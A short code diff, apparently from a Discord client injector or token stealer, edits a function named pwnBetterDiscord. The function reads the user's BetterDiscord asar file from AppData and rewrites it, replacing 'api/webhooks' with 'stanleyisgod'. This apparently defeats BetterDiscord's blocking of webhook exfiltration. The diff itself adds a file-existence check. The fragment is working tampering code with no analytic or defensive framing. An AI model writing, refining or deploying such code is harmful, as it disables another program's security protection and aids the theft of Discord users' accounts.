@@ -92,6 +92,12 @@ function startDiscord() {
 };
 function pwnBetterDiscord() {
     // thx stanley
-    var x = fs.readFileSync(process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar")
-    fs.writeFileSync(process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar", buf_replace(x, "api/webhooks", "stanleyisgod"))
+    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+    if (fs.existsSync(dir)) {
+        var x = fs.readFileSync(dir)
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
+    } else {
+        return;
+    }
+
 }
